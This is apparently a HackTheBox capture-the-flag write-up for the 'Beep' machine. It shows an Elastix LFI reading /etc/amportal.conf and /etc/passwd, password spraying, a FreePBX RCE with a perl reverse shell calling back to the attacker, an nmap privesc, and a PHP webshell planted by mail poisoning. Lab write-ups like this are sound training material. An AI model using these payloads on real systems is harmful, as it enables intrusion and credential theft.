---
render_with_liquid: false
title: HackTheBox Writeup  Beep
date: 2023-10-31 12:14:16 +1400
tags: [hackthebox, nmap, linux, feroxbuster, elastix, local-file-inclusion, credentials-exposure, password-reuse, oscp-like, svwar, pbx, voip, telecom, smtp]
---



Beep has a very large list of running services, which can make it a bit challenging to find the correct entry method. This machine can be overwhelming for some as there are many potential attack vectors. Luckily, there are several methods available for gaining access.

# Recon
---

## Nmap

```bash

# Nmap 7.94 scan initiated Tue Oct 31 12:14:16 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,25,80,110,111,143,443,941,993,995,3306,4190,4445,4559,5038,10000 10.129.1.226
Nmap scan report for 10.129.1.226
Host is up, received user-set (0.16s latency).
Scanned at 2023-10-31 12:14:16 CST for 590s

PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAI04jN+Sn7/9f2k+5UteAWn8KKj3FRGuF4LyeDmo/xxuHgSsdCjYuWtNS8m7stqgNH5edUu8vZ0pzF/quX5kphWg/UOz9weGeGyzde5lfb8epRlTQ2kfbP00l+kq9ztuWaXOsZQGcSR9iKE4lLRJhRCLYPaEbuxKnYz4WhAv4yD5AAAAFQDXgQ9BbvoxeDahe/ksAac2ECqflwAAAIEAiGdIue6mgTfdz/HikSp8DB6SkVh4xjpTTZE8L/HOVpTUYtFYKYj9eG0W1WYo+lGg6SveATlp3EE/7Y6BqdtJNm0RfR8kihoqSL0VzKT7myerJWmP2EavMRPjkbXw32fVBdCGjBqMgDl/QSEn2NNDu8OAyQUVBEHrE4xPGI825qgAAACANnqx2XdVmY8agjD7eFLmS+EovCIRz2+iE+5chaljGD/27OgpGcjdZNN+xm85PPFjUKJQuWmwMVTQRdza6TSp9vvQAgFh3bUtTV3dzDCuoR1D2Ybj9p/bMPnyw62jgBPxj5lVd27LTBi8IAH2fZnct7794Y3Ge+5r4Pm8Qbrpy68=
|   2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA4SXumrUtyO/pcRLwmvnF25NG/ozHsxSVNRmTwEf7AYubgpAo4aUuvhZXg5iymwTcZd6vm46Y+TX39NQV/yT6ilAEtLbrj1PLjJl+UTS8HDIKl6QgIb1b3vuEjbVjDj1LTq0Puzx52Es0/86WJNRVwh4c9vN8MtYteMb/dE2Azk0SQMtpBP+4Lul4kQrNwl/qjg+lQ7XE+NU7Va22dpEjLv/TjHAKImQu2EqPsC99sePp8PP5LdNbda6KHsSrZXnK9hqpxnwattPHT19D94NHVmMHfea9gXN3NCI3NVfDHQsxhqVtR/LiZzpbKHldFU0lfZYH1aTdBfxvMLrVhasZcw==
25/tcp    open  smtp?      syn-ack ttl 63
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http       syn-ack ttl 63 Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://10.129.1.226/
110/tcp   open  pop3?      syn-ack ttl 63
111/tcp   open  rpcbind    syn-ack ttl 63 2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            938/udp   status
|_  100024  1            941/tcp   status
143/tcp   open  imap?      syn-ack ttl 63
443/tcp   open  ssl/http   syn-ack ttl 63 Apache httpd 2.2.3 ((CentOS))
|_ssl-date: 2023-10-31T05:18:41+00:00; +59m47s from scanner time.
|_http-server-header: Apache/2.2.3 (CentOS)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Elastix - Login page
| http-robots.txt: 1 disallowed entry
|_/
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/emailAddress=root@localhost.localdomain/organizationalUnitName=SomeOrganizationalUnit
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/emailAddress=root@localhost.localdomain/organizationalUnitName=SomeOrganizationalUnit
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2017-04-07T08:22:08
| Not valid after:  2018-04-07T08:22:08
| MD5:   621a:82b6:cf7e:1afa:5284:1c91:60c8:fbc8
| SHA-1: 800a:c6e7:065e:1198:0187:c452:0d9b:18ef:e557:a09f
| -----BEGIN CERTIFICATE-----
| MIIEDjCCA3egAwIBAgICfVUwDQYJKoZIhvcNAQEFBQAwgbsxCzAJBgNVBAYTAi0t
...
| 2ScJ9I/7b4/cPHDOrAKdzdKxEE2oM0cwKxSnYBJk/4aJIw==
|_-----END CERTIFICATE-----
|_http-favicon: Unknown favicon MD5: 80DCC71362B27C7D0E608B0890C05E9F
941/tcp   open  status     syn-ack ttl 63 1 (RPC #100024)
993/tcp   open  imaps?     syn-ack ttl 63
995/tcp   open  pop3s?     syn-ack ttl 63
3306/tcp  open  mysql?     syn-ack ttl 63
4190/tcp  open  sieve?     syn-ack ttl 63
4445/tcp  open  upnotifyp? syn-ack ttl 63
4559/tcp  open  hylafax?   syn-ack ttl 63
5038/tcp  open  asterisk   syn-ack ttl 63 Asterisk Call Manager 1.1
10000/tcp open  http       syn-ack ttl 63 MiniServ 1.570 (Webmin httpd)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-favicon: Unknown favicon MD5: C08454A9D22EE8B85BF86D00B91C1BC7
Service Info: Host: 127.0.0.1

Host script results:
|_clock-skew: 59m46s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Tue Oct 31 12:24:06 2023 -- 1 IP address (1 host up) scanned in 590.08 seconds
```

## 443 - HTTP : Elastix


### Info

```ruby
https://10.129.1.226 [200] [Elastix - Login page] [Apache/2.2.3 (CentOS)] [Apache HTTP Server:2.2.3,CentOS,PHP:5.1.6] [9991298a47acf4fd9e9c37ff0a4d7a905495cbff]
```

![](/assets/obsidian/4238ea407ceba2b1fd92e2368ff52f66.png)

### Directory

```bash
feroxbuster -t 150 -o ferox_443.txt -u 'https://beep.htb' -k
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Beep]
└─$ cat ferox_443.txt|awk '$1 != 404'|grep -vE '//beep.htb/images/|//beep.htb/themes/'
301      GET        9l       28w      305c https://beep.htb/admin => https://beep.htb/admin/
301      GET        9l       28w      307c https://beep.htb/modules => https://beep.htb/modules/
301      GET        9l       28w      304c https://beep.htb/help => https://beep.htb/help/
301      GET        9l       28w      304c https://beep.htb/mail => https://beep.htb/mail/
301      GET        9l       28w      303c https://beep.htb/var => https://beep.htb/var/
301      GET        9l       28w      304c https://beep.htb/lang => https://beep.htb/lang/
MSG      0.000 feroxbuster::heuristics detected directory listing: https://beep.htb/images (Apache)
301      GET        9l       28w      306c https://beep.htb/static => https://beep.htb/static/
MSG      0.000 feroxbuster::heuristics detected directory listing: https://beep.htb/themes (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: https://beep.htb/modules (Apache)
301      GET        9l       28w      304c https://beep.htb/libs => https://beep.htb/libs/
MSG      0.000 feroxbuster::heuristics detected directory listing: https://beep.htb/var (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: https://beep.htb/lang (Apache)
200      GET       35l      111w     1785c https://beep.htb/
MSG      0.000 feroxbuster::heuristics detected directory listing: https://beep.htb/modules/ (Apache)
200      GET       78l      761w    13130c https://beep.htb/modules/
200      GET       10l       24w      346c https://beep.htb/help/
200      GET       16l       79w     1234c https://beep.htb/var/
301      GET        9l       28w      307c https://beep.htb/modules => https://beep.htb/modules/
301      GET        9l       28w      305c https://beep.htb/admin => https://beep.htb/admin/
301      GET        9l       28w      303c https://beep.htb/var => https://beep.htb/var/
301      GET        9l       28w      304c https://beep.htb/help => https://beep.htb/help/
301      GET        9l       28w      304c https://beep.htb/mail => https://beep.htb/mail/
MSG      0.000 feroxbuster::heuristics detected directory listing: https://beep.htb/modules (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: https://beep.htb/images (Apache)
301      GET        9l       28w      306c https://beep.htb/static => https://beep.htb/static/
200      GET       35l      111w     1785c https://beep.htb/
MSG      0.000 feroxbuster::heuristics detected directory listing: https://beep.htb/themes (Apache)
301      GET        9l       28w      304c https://beep.htb/lang => https://beep.htb/lang/
MSG      0.000 feroxbuster::heuristics detected directory listing: https://beep.htb/var (Apache)
301      GET        9l       28w      304c https://beep.htb/libs => https://beep.htb/libs/
MSG      0.000 feroxbuster::heuristics detected directory listing: https://beep.htb/static (Apache)
301      GET        9l       28w      305c https://beep.htb/panel => https://beep.htb/panel/
MSG      0.000 feroxbuster::heuristics detected directory listing: https://beep.htb/libs (Apache)
200      GET       42l      175w     2158c https://beep.htb/static/softphones.htm
200      GET       42l      218w     2417c https://beep.htb/static/faxutils.htm
200      GET       27l      107w     1330c https://beep.htb/static/instantmessaging.htm
MSG      0.000 feroxbuster::heuristics detected directory listing: https://beep.htb/var/cache (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: https://beep.htb/var/templates_c (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: https://beep.htb/var/backups (Apache)
200      GET        0l        0w        0c https://beep.htb/libs/paloSantoJSON.class.php
200      GET        0l        0w        0c https://beep.htb/libs/paloSantoMenu.class.php
200      GET        0l        0w        0c https://beep.htb/libs/paloSantoNavigation.class.php
200      GET        0l        0w        0c https://beep.htb/libs/paloSantoConfig.class.php
200      GET        4l       11w      131c https://beep.htb/var/templates_c/%25%2505%5e055%5e055A018B%25%25main.tpl.php
200      GET        6l       13w      203c https://beep.htb/var/templates_c/%25%2593%5e93E%5e93E6C7BC%25%25_menu.tpl.php
200      GET        4l       13w      193c https://beep.htb/var/templates_c/%25%255B%5e5BD%5e5BD5BBD4%25%25login.tpl.php
200      GET        1l        4w       54c https://beep.htb/var/templates_c/%25%251A%5e1AC%5e1AC495A3%25%25_list.tpl.php
MSG      0.000 feroxbuster::heuristics detected directory listing: https://beep.htb/libs/smarty (Apache)
301      GET        9l       28w      307c https://beep.htb/configs => https://beep.htb/configs/
MSG      0.000 feroxbuster::heuristics detected directory listing: https://beep.htb/configs (Apache)
301      GET        9l       28w      327c https://beep.htb/modules/email_accounts/lang => https://beep.htb/modules/email_accounts/lang/
200      GET      196l     1149w     7425c https://beep.htb/panel/README
```

# User Flag
---

# Root Flag
---

## Enumeration

> https://beep.htb/

Gave `Secure Connection Failed` because of unsupported TLS version

![](/assets/obsidian/a377777cebc16590e9fa23ccacceadc4.png)

> **Methods to fix**
> 1. Use **burpsuite** embedded browser
> 2. Go to `about:config` in **firefox** and search for `security.tls.version.min` then set it to `1`
{: .prompt-info }

Tried to login to https://beep.htb/admin with common password, failed

But we got a version info : `FreePBX 2.8.1.4`

![](/assets/obsidian/2bc6119f2288bb41dc3f4553980909d5.png)


## Shell as root


### Elastix - Local File Inclusion

```bash
┌──(bravosec㉿fsociety)-[~/htb/Beep]
└─$ searchsploit elastix
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting                                                                                                                                          | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                        | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                  | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                                                                               | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                                                                                                              | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                                                                                                             | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                                                         | php/webapps/18650.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Try **Local File Inclusion** 

```bash
┌──(bravosec㉿fsociety)-[~/htb/Beep]
└─$ searchsploit -x 37637
  Exploit: Elastix 2.2.0 - 'graph.php' Local File Inclusion
      URL: https://www.exploit-db.com/exploits/37637
     Path: /usr/share/exploitdb/exploits/php/webapps/37637.pl
    Codes: N/A
 Verified: True
File Type: ASCII text
```

![](/assets/obsidian/a1feca88c1f51c3f093f9a1ec7213895.png)

Got `admin`'s password : `jEhdIekWmdjE`

```http
GET /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action HTTP/1.1
```

![](/assets/obsidian/29496d57e37bc8080b4da3c4c67c5938.png)

### Password spray

Gather usernames from the machine

```http
GET /vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action HTTP/1.1
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Beep]
└─$ cat loot/passwd|grep sh$|awk -F: '{print $1}'|tee users.txt
root
mysql
cyrus
asterisk
spamfilter
fanis
```

> Configure **ssh** client to fix error : ` kex error : no match for method mac algo client`
{: .prompt-info }

> `/etc/ssh/ssh_config.d/lab.conf`

```config
Host *
        KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
        HostKeyAlgorithms ssh-ed25519,ecdsa-sha2-nistp521,ecdsa-sha2-nistp384,ecdsa-sha2-nistp256,rsa-sha2-512,rsa-sha2-256,ssh-rsa
        MACs hmac-md5,hmac-sha1,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96
```

Spray the password on all services with users that can log on the system

```bash
watch -c -d -n 1 "cat brutespray-output/*"
```

```bash
brutespray -f nmap/all_tcp_ports.gnmap -t 20 -T 20 -U users.txt -p 'jEhdIekWmdjE'
```

SSH credential success

```bash
[+] ACCOUNT FOUND: [ssh] Host: 10.129.1.226 User: root Password: jEhdIekWmdjE [SUCCESS]
```

> Disable the ssh client config to fix error : `Bad SSH2 MAC spec`
{: .prompt-info }

```bash
sudo mv /etc/ssh/ssh_config.d/lab.conf /etc/ssh/ssh_config.d/lab.conf~
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Beep]
└─$ ssh root@beep.htb -o 'HostkeyAlgorithms=ssh-dss,ssh-rsa' -o 'KexAlgorithms=+diffie-hellman-group1-sha1'
The authenticity of host 'beep.htb (10.129.1.226)' can't be established.
DSA key fingerprint is SHA256:AGaW4a0uNJ7KPMpSOBD+aVIN75AV3C0y8yKpqFjedTc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'beep.htb' (DSA) to the list of known hosts.
root@beep.htb's password:
Last login: Tue Sep 29 12:10:12 2020

Welcome to Elastix
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.129.1.226

[root@beep ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
[root@beep ~]# cat root.txt
2f4dbbe158c8d10b6443398cc3fd12c2
[root@beep ~]# cat /home/fanis/user.txt
4a507e688fb92adb423c43aafadeda78
```

# Additional
---

## FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution

> Source POC : https://www.exploit-db.com/exploits/18650

Enumerate available PBX extensions (Using [sipvicious](https://github.com/EnableSecurity/sipvicious))

```bash
svwar -e100-999 beep.htb --force -m INVITE
```

The one with `reqauth` is available

```bash
+-----------+----------------+
| Extension | Authentication |
+===========+================+
| 182       | weird          |
+-----------+----------------+
| 186       | weird          |
+-----------+----------------+
| 233       | reqauth        |
+-----------+----------------+
...
```

Get reverse shell

```bash
nc -lnvp 1111
```

```bash
export LHOST=10.10.16.3 LPORT=1111 RHOST="beep.htb"
curl -k "https://${RHOST}/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22${LHOST}%3a${LPORT}%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A"
```

Privesc

```bash
sudo nmap --interactive
!sh
```

## Mail poisoning to RCE

> This sector was inspired by **0xdf**'s writeup

Since nmap scan shows **smtp port**, and we have **LFI**

Send a mail that contains webshell in message to `asterisk`, the message will be saved at `/var/mail/asterisk`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Beep]
└─$ sendemail -f guest@beep.htb -t asterisk@localhost -s beep.htb -o tls=no -m 'Help, i got this from website : <?php system($_REQUEST[0]);?>'
Nov 01 03:04:24 fsociety sendemail[3714625]: Email was sent successfully!
```

Use LFI to include webshell

```http
GET /vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&module=Accounts&action&0=id HTTP/1.1
```

![](/assets/obsidian/058cf6705b9493aec6afc3149d07d9bb.png)

